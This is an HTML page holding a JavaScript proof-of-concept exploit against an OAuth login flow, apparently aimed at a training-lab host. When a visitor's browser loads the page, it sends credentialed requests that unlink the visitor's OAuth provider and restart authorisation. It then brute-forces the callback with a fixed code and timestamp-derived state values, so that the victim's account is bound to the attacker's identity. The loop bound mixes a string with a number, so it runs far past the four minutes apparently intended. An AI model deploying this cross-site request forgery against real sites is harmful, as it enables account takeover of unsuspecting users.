<!DOCTYPE html>

  <body>
<script>


(async ()=>{
    var client_url = "http://ptl-1801d3a9-e148ea13.libcurl.so"
    var code = "ec9d64f6ac751c6880fcf2f395f92b523a653e7fe66a5e0788c12263b827267e"
    var state = "2021080823"
    var utc_m= "17"
    
    function zeroPad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }


    try {
        await fetch(client_url+"/unlink", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }

    try {
        await fetch(client_url+"/users/auth/myprovider", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }
    for (let m=utc_m; m<utc_m+4; m++)
    {
        for (let s=0;s<60;s++) {
            try {
                await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2)+zeroPad(s,2), {
                    credentials: 'include'
                })
            }
            catch(e) {
                console.log("BB"+e);
            }
        }
    }
})();
</script>
